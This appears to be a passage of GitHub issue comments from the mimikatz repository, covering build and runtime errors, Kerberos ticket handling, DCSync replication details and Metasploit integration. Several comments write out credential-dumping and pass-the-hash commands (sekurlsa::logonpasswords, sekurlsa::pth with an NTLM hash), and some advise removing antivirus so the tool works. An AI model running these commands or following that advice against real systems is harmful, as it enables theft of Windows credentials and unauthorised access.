\"secret\".. Hello :)\nStrange, it may indicate that I did not find correctly a variable.\nCould you send output of:\nversion /full\nand better:\nversion /cab (only binaries inside). Error message say you already registered / started mimidrv... maybe in another mimikatz, in // or before.\nDriver is OK in this case.. I don't have VS 2017 on my laptop to test, but will when back to home :)\nBut yes, usually casting is enough (turning off warning is not really good :D :D). if you had already a silver ticket to LDAP, why need to stole/crack/kerberoast?\nbefore all, if you have a valid one, you can check your LDAP connection with ldp.exe by eg.. Maybe search for a lots of Console option ;). ",
    "Crack": "AFAIR it worked, but I can verify it on Monday. I converted my system to VM and started uninstalling programs, and after NOD32 Antivirus got removed I could patch CNG. So problem solved, AV software, even in \"protection disabled\" mode, was causing this to fail.\n. ",
    "opexxx": "try x64 version instead of win32\n. ",
    "Kuzirashi": "Uninstall Avast. Helped for me.. After uninstalling Avast (even before reboot) command magically worked. So just get rid of it.. ",
    "jun0s": "Sorry men!! and thanks\n. Sorry for dont give u the details... and i try with VS2013 on win 8.1....now the compilation its complete with ur modifcations... very thanks u benjamin!!!\n. yeah... i understood, anyway very few of my targets have win2K servers, thank you benjamin.\n. https://github.com/rvazarkar/KrbCredExport \n. I forgot kekeo -.-\u00b4 but he say \"under linux\" \n.  Sorry, this dump file it\u00b4s old (almost two years)... i suppose that this \"Microsoft Windows Server 2012 R2 Essentials, (6.3.9600.16384)\" but i can\u00b4t be sure, because i don\u00b4t remember where i get the file. \nAnd is a \"producction server\" i can\u00b4t share :( \n. windbg mode works!!\n. of course...!\nWLsaEnumerateLogonSession.txt\n. ",
    "catsaregreat": "So there's no way of getting the password for windows 8.1?\nAnd if so what do I type in mimikatz to get it\n. ",
    "hapylestat": "Would be this patch merged? I think it's very use full to be able to get short list of available commands.\n@gentilkiwi FYI\n. ",
    "ch0k0bn": "after a bunch of update i was still on 6.3.9600.16384 i picked 3 optionnal updates and moved to 17415, everything working well now. Thanks\n. ",
    "missingplugin": "Thanks for the reply.  I verified the kerberos tickets, It was there in the memory,  Even after that I am not able to access domain server resources Perhaps because of the fact that non-domain joined systems uses NTLM authentication by default. I am in process to figure out to enable Kerberos for non-domain joined systems, probably I will need to install Kerberos client software. isn't it? Correct me if I am wrong? \nThanks Again.\n. Hi, Finally I figured it out, I wasn't doing it exactly right. \nThanks a alot for your support.\n. ",
    "gennez": "Hello,\nI am having the same problem and can't figure out what i'm doing wrong... Can you kindly share how you managed to solve it please?\nThanks :) \n. ",
    "TopazA": "Hey, Not necessarily in the outputs, but in the codebase its-self and any documentation that might be relevant (eg, blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash ) ,ive noticed a few bits and pieces of the code-base (but not display) are still in French. \nThis came about after having a chat to someone working on porting the Mimikatz functionality into meterpreter... I figured if i could help two of my favourite projects at once why not? \nAlso happy to help contribute to the wiki here: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-remote-execution etc if you'd like? (Edit: I got bored (REALLY dont feel like doing report writing!) http://pastebin.com/PKbCaRFG and did this, hopefully its what you were after/suitable?)\nCheers,\n. ",
    "Thanathan-k": "Thank you guys! I'll have a look at the python project, as well as the provided links to get some more understanding of the topic :)\nEdit: Okay KrbCredExport works, but tgsrepcrack from Kerberoast is unable to crack the file. Even though it's detected as ticket. Maybe I need to split the output into the TGT and Service tickets. I'll have a look into that.\nEdit2: Okay KrbCredExport only took the first credential. A simple while loop fixed it. Now it works. Thanks guys! I may commit the change to KrbCredExport.\n. ",
    "ghost": "Scriptkiddies vs twitter followers, really.\nIts not a huge problem, just recompiling it was pretty simple once we figured out that was the issue.  Not sure I agree with your idea of that as a feature to catch \"scriptkiddies\".  If you don't want scriptkiddies to use mimikatz, dont release a public binary and force people to compile it themselves.\n. please repent.. @gentilwiki If I say \"mimikatz.exe privilege::debug log U:/results/mimikatz.txt sekurlsa::logonpasswords\", it will think that \"log\" and \"U:/results/mimikatz.txt\" are two different commands. Any ways to run around this issue?\n. @gentilkiwi Ah, thank you. it's my first time making a batch file, haha.\n. Oh yeah sorry. I understood now but i thought it can be useful. Sorry for this. So much thanks i luv mimikatz . more_ power . i've deleted my files 'cause of copyright ! \n. ",
    "Neo23x0": "I disagree. \nIt was a good idea to leave that value there.\n\"If you don't want scriptkiddies to use mimikatz, ...\"\n@Raikia517 You didn't get the intention right.\nThe idea behind that value was not to avoid(!) script kiddies using mimikatz. \nThe idea was to detect(!) script kiddies using mimikatz. \nThat's a big difference. \nI liked that value. Even nation state sponsored groups used and still use precompiled mimikatz binaries. (< I am not kidding - that's the sad truth). ",
    "wenzhangkai": "i'm so sorry.i can't fix it \n\u901a\u8fc7\u6211\u7684 Moto X \u53d1\u9001\nOn Nov 11, 2015 12:26 PM, Tosone notifications@github.com wrote:\n\nwin10, it doesn't work. Can you fix it ?\n\u2014\nReply to this email directly or view it on GitHub.\n\u901a\u8fc7\u6211\u7684 Moto X \u53d1\u9001\n. \n",
    "b3mb4m": "W10 Still not stable.Not worth  write anything .. \n. ",
    "maaaaz": "H\u00e9h\u00e9 that's true :)\nThe bug still exists on the most up-to-date version (latest KB: KB3112336) of that OS.\nCrash_mimikatz_sekurlsa_tickets_export_update.zip\nHappy new year and happy debugging !\nCheers.\n. Thanks !\n. FYI I tested your new version on the machine on which I experienced the bug : it now works flawlessly.\nThanks @gentilkiwi ! . ",
    "tazeat": "Are you running as an admin user? \n. ",
    "Yangff": "I'm using windows10 1511 11099.1000\nAnd, I can run \nmimikatz # privilege::debug\nPrivilege '20' OK\nHowever, get ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list, when I try to sekurlsa::logonpasswords.\n. ",
    "HackM3nt3": "That kind of error is common when its used the software deep freeze to stop virus and other applications in the registry.\n. Can mimikatz bypass deep freeze? that's the real question i believe ..................\n. ",
    "shawmoo": "What test should I do with certutil?\n. Ok... certutil says \"Encryption test FAILED\".  I guess the private key is messed up.  Sorry for bothering you with this.  Thanks though!\n. ",
    "OJ": "Hey Ben!\nThanks for the response.\nSo basically what I'd love to get is a \"Mimikatz API\". The console version of Mimikatz would just invoke the API and print it to screen. The Meterp version would translate the structures to TLV packets to send back to MSF.\nI realise that this can go quite deep given that there are a few low-level printf() calls. But I am more than happy to help make this happen.\nI think I should throw together some sort of design suggestions for you to read so that we can get to a point of agreement. But I think if we could make it so that there is a core mimikatz.lib, and that lib is linked into a both a console version and others such as Meterp, then that'd be awesome.\nThanks for being open to the discussion!\n. \ud83d\ude4c . At the moment I am having some issues with the script functioning correctly when I try to bake the new DLL files into Invoke-Mimikatz. The error is exactly the same as the one listed here https://github.com/PowerShellMafia/PowerSploit/issues/147\nThe module/function combination is different, but the error is the same. Looking into it at the moment.. Hi @gentilkiwi,\nI'm going to close this PR, and instead we're going to maintain these few changes locally in our fork. This will remove the workload from you! Given the changes are so small, maintaining them at our end shouldn't be a problem. From there, we can merge in your changes and get them into MSF as new features appear.\nThanks again for the support!\n. ",
    "nightmared": "Maybe this would imply creating strucs for storing answers from the API (or even linked chains of structs, like a list of credentials structures for the answer of sekurlsa::logonPasswords) ? I agree it would be better to be able to embed just a \"sane\" mimikatz library without all the user interact part (e.g. For automated test). It would allow people to get mimikatz results and format them to JSON or Toml or whatever, and use it with different tools latter.\n. Wow ! This PR is a troll, isn't it ?\n. I don't know. Maybe adding inconsistent style in source code shall be considered a good practice ? no idea :-D\n. ",
    "sltang": "Hi,\nWhen I enrolled and installed the certificate, I did not use a smart card.\nI use the certificate without a smart card. Does it mean it is not a smart\ncard certificate?\nOn Sun, Feb 21, 2016 at 11:49 AM, Benjamin DELPY notifications@github.com\nwrote:\n\nIt seems to be a SmartCard/Token certificate (not a Microsoft CSP, but a\nSymantec one).\nI've seen multiple times incorrect private export status when SmartCard (\nhttps://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates)\nYour certutil result make me think you don't have the SmartCard/Token\ninserted ;)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/27#issuecomment-186897161.\n. \n",
    "dlenski": "I've had the exact same problem as @sltang: I can only export the certificate, but not the private key, from Symantec PKI Client. (MimiKatz 2.1 and Symantec PKI Client v2.15)\nAccording to this blog post from August 2014, it was possible to export the private keys from Symantec PKI Client\u2026 possibly Symantec has changed something about the way that they store the private keys :-1:\n. ",
    "rugk": "Well.. okay.\nBut in this case the last sentence in the Readme is wrong:\n\nThis is a personal development\n\ndevelopment or art?\n. ",
    "AndrewSav": "@t0b1nux so someone wanted to help with formatting and style, what's wrong with that? =)\n. ",
    "MichaelGrafnetter": "Thx for your reply. I know about the /run parameter, but I did not know that you can pass the whole command line to it.\nBut I still have not figured out a way to use it in batch mode, e.g. from BAT or PS1 scripts, which is the way I use mimikatz mostly. This has not worked for me:\nmimikatz.exe sekurlsa::pth /user:Administrator /domain:contoso.com /ntlm:ba8098ba09890a80b9a8098b \"/run:cmd.exe /c systeminfo\" exit\n. Neither /run\"foo bar\", nor /run:\"foo bar\"works for me :-( Powershell is not helpful, either, because the entire command line has to be passed as a single string:\n.\\mimikatz.exe \"sekurlsa::pth /user:$userName /domain:$domain /ntlm:$hash /run:cmd.exe\" exit\nBut nevermind, it is not that important. I just thought there would be a trivial solution.\n. Well, the documentation on dwReplEpoch clearly says that\n\nThis value is set to zero by all client callers.\n\nLessons learned: Do not trust the documentation. ;-) On the other hand, mimikatz or DSInternals do way more than a regular client caller.\n. Of course that by client they mean Windows 7, which uses IDL_DRSCrackNames extensively. That is the security problem of this protocol: It mixes DC-DC, client-DC and admin-DC communication, so you cannot block it by firewall.\n. I have also heared that when you use Remote Desktop RemoteApp, cleartext passwords are cached by the wksprt.exe process and handed over to mstsc.exe on-demand, even on Windows 10. But I did not have time to verify it.\n. @asolino It seems that once PAM is enabled, DC only returns DRS_MSG_GETCHGREPLY_V9 and fails if the client does not support it, because otherwise it could not tell the client about the expiring links.\n. @gentilkiwi You read my mind!\n. There are still a few undocumented flags, because TP5 returns this in DRS_EXTENSIONS_INT with RB+PAM enabled:\ndwExtCaps = 2047\ndwFlagsExt = 526\ndwFlags = 1073741695\n. So it was fun with flags after all... Sorry for spreading unverified info, @asolino . But to my excuse, even the doc is somewhat smoke and mirrors.\n. I have fixed it in DSInternals, too, but you beat me to it. Nevertheless, I just learned something and I had fun doing it. ;-)\n. @gentilkiwi Hopefully, your cannonball approach will turn out to be futureproof. And Ben, you really are a meme machine! ;-)\n. Hi @jmvdbreekel, aren't you just misinterpreting the results? Below is a sample DCSync output, containing the current NTLM hash from the unicodePwd attribute, 3 historical NTLM hashes from the ntPwdHistory attribute and 2 historical LM hashes from the lmPwdHistory attribute. Because storing LM hashes is disabled on that DC, the dBCSPwd attribute is empty and mimikatz does not display it. Moreover, the historical LM hashes are randomly generated during each password change, for some strange reason.\n. ",
    "benjamindoron": "Check this out\nhttp://www.attactics.org/2015/09/windows-10-extracting-hashes-plaintext.html\n. ",
    "mellamofiras": "No, that not worked, because my error was\n \"ERROR kuhl_m_sekurlsa_acquireLSA ; Modules Informations\"\n \"ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_regOpenKeyEx (SECURITY)\n\"ERROR kuhl_m_lsadump_getUsersandSamKey ; kull_m_registry_regOpenKeyEx SAM accounts (0x00000005)\" \nMy error wasnt extracting the haches.\nbut Thanks for help :D\n. ",
    "zqguang3708": "Year,I open with administrator   then got the password is (NULL)\nBut can dump  SHA1 & NTLM\nIs there anything wrong?\n. ",
    "tigros": "are you running cmd as admin?\n. ",
    "WGierke": "No and that solved the problem ... thank you very much!\n. ",
    "rmbolger": "Glad to help. And yeah, domain renames are definitely rare and can be cumbersome if you have a lot of services already running against it.  But I think the process has been officially supported since at least AD 2003.\n. This is the first time I've read this deep into the replication protocol. And I'm confused about their \"client\" and \"server\" terms.  Can't decide whether they mean a generic client/server like caller/endpoint...or more specifically a replication client vs a replication server.  And since mimikats is impersonating a server in this case, it would need to follow the second sentence.\n\nThe server sets this value by assigning the value of msDS-ReplicationEpoch from its nTDSDSA object.\n\nBut because we're only a fake server, we don't actually have an nTDSDSA object of our own to check. So we need to cheat, check the target DC's value, and match it.\n. Here's a better reference in the docs for IDL_DRSBind.\n\nThe client uses pextClient to pass a properly initialized DRS_EXTENSIONS_INT structure to the server. If the client is a DC, it reads the value of msDS-ReplicationEpoch from its nTDSDSA object and assigns this value to the dwReplEpoch field of the DRS_EXTENSIONS_INT structure;\n. \n",
    "speidy": "Cool :) thanks for updating\n\u05d1\u05ea\u05d0\u05e8\u05d9\u05da \u05d9\u05d5\u05dd \u05d5\u05f3, 29 \u05d1\u05d0\u05e4\u05e8\u05f3 2016 \u05d1-0:58 \u05de\u05d0\u05ea Ryan Bolger \nnotifications@github.com:\n\nGlad to help. And yeah, domain renames are definitely rare and can be\ncumbersome if you have a lot of services already running against it. But I\nthink the process has been officially supported since at least AD 2003.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly or view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/35#issuecomment-215575331\n. \n",
    "goldfinger2": "@gentilkiwi NoPe. Thanks.\nlsass2.zip\n. Hi Benjamin,\nthanks for the fast reply.\nThe password is:\nP@ssw0rd!\nThanks\u00a0\nJ\u00fcrgen\n. No currently not but we can make it at the end of this week.\nJ\u00fcrgen\n. Salut Benjamin,\nhere your dumps.\nWe made a connection from source with active credential guard (lsass-source-rdp-cg) with mstsc /remoteGuard to the target (lsass-target-rg)\nExecuting mimikatz on the target with sekurlsa::tickets we get a crash.\nWe used sadmin with P@ssw0rd!\nlsass-target-rgc.zip\nlsass-source-rdp-cg.zip\n. Yes, he is in the Protected User Group, too.\nJ\u00fcrgen\n. Salut Benjamin,\nI forgot to attach the user information.\u00a0\nWe used claims, too. May be they can be counterfeit soon and easy by the mimikatz golden ticket creation. ;-)\nBy the way is there a mimikatz command to list the Kerberos PAC field authorization information directly?\nJuergen\n```\nwhoami /all\nUSER INFORMATION\n\nUser Name\u00a0\u00a0\u00a0\u00a0\u00a0 SID\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n============== =============================================\ncompany\\sadmin S-1-5-21-504569365-2122958605-3922303804-1609\nGROUP INFORMATION\nGroup Name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Type\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 SID\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Attributes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n============================================== ================ ============================================ ===============================================================\nEveryone\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-1-0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nBUILTIN\\Users\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Alias\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-32-545\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nBUILTIN\\Administrators\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Alias\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-32-544\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group, Group owner\nNT AUTHORITY\\INTERACTIVE\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-5-4\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCONSOLE LOGON\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-2-1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nNT AUTHORITY\\Authenticated Users\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-5-11\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nNT AUTHORITY\\This Organization\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-5-15\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nLOCAL\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-2-0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCOMPANY\\Group Policy Creator Owners\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-21-504569365-2122958605-3922303804-520 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCOMPANY\\Domain Admins\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-21-504569365-2122958605-3922303804-512 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCOMPANY\\Protected Users\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-21-504569365-2122958605-3922303804-525 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCOMPANY\\Schema Admins\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-21-504569365-2122958605-3922303804-518 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCOMPANY\\Enterprise Admins\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-21-504569365-2122958605-3922303804-519 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nNT AUTHORITY\\Claims Valid\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-5-21-0-0-0-497\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nAuthentication authority asserted identity\u00a0\u00a0\u00a0\u00a0 Well-known group S-1-18-1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Mandatory group, Enabled by default, Enabled group\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nCOMPANY\\Denied RODC Password Replication Group Alias\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-5-21-504569365-2122958605-3922303804-572 Mandatory group, Enabled by default, Enabled group, Local Group\nMandatory Label\\High Mandatory Level\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Label\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S-1-16-12288\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\nPRIVILEGES INFORMATION\nPrivilege Name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Description\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 State\u00a0\u00a0\n========================================= ================================================================== ========\nSeIncreaseQuotaPrivilege\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Adjust memory quotas for a 